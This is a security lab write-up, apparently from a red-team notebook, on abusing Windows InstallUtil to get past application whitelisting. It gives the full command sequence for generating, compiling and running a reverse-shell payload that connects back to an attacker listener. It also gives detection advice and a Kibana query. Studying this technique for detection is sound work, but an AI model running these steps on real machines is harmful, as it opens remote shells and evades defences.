# InstallUtil

## InstallUtil

### Execution

First of, let's generate a C# payload (with [InstallUtil script](https://github.com/khr0x40sh/WhiteListEvasion)) that contains shellcode from msfvenom and upload the temp.cs file to victim's machine:

{% code title="attacker\@local" %}
```csharp
python InstallUtil.py --cs_file temp.cs --exe_file temp.exe --payload windowsreverse_shell_tcp --lhost 10.0.0.5 --lport 443
```
{% endcode %}

Compile the .cs to an .exe:

{% code title="attacker\@victim" %}
```csharp
PS C:\Windows\Microsoft.NET\Framework\v4.0.30319> .\csc.exe C:\experiments\installUtil\temp.cs
```
{% endcode %}

Execute the payload:

{% code title="attacker\@victim" %}
```csharp
PS C:\Windows\Microsoft.NET\Framework\v4.0.30319> .\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Microsoft.NET\Framework\v4.0.30319\temp.exe
Microsoft (R) .NET Framework Installation utility Version 4.0.30319.17929
Copyright (C) Microsoft Corporation.  All rights reserved.

Hello From Uninstall...I carry out the real work...
```
{% endcode %}

Enjoy the sweet reverse shell:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHUjNxZMxfwVwdupRUx%2F-LHUlRemzkmdPnsbKP5U%2Finstallutil-shell.png?alt=media\&token=332ebb33-e6b0-439b-a4b6-e6f9377867dd)

### Observations

Look for `InstallUtil` processes that have established connections, especially those with cmd or powershell processes running as children - you should treat them as suspicious and investigate the endpoint closer:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHUjNxZMxfwVwdupRUx%2F-LHUlaDwNxHutv7Ow4Vc%2Finstallutil-procexp.png?alt=media\&token=391cadae-7ad9-429d-98fa-e05f99574527)

A very primitive query in kibana allowing to find events where InstallUtil spawns cmd:

{% code title="kibana" %}
```
event_data.ParentCommandLine:"*installutil.exe*" && event_data.Image:cmd.exe
```
{% endcode %}

![InstallUtil launching the malicious payload](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHUrrWUv9F_Avv0_GNj%2F-LHUsNMxVLuWKHFkmlhs%2Finstallutil-kibana.png?alt=media\&token=dae05f23-d92c-4e08-a45e-c8cbc2b93f26)

![csc.exe created a temp.exe which contains the reverse shell payload](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHUxNBkO9enEMOmdEaU%2F-LHUxQNLHymXzkR8SwSY%2Finstallutils-csc.png?alt=media\&token=71bc83dc-8d9d-46e4-b762-1d561bc0daf1)

What is interesting is that I could not see an established network connection logged in sysmon logs, although I could see other network connections from the victim machine being logged.

{% hint style="danger" %}
Will be coming back to this one for further inspection - possibly related to sysmon configuration.
{% endhint %}

### References

{% embed url="https://attack.mitre.org/wiki/Technique/T1118" %}

{% embed url="https://github.com/khr0x40sh/WhiteListEvasion" %}
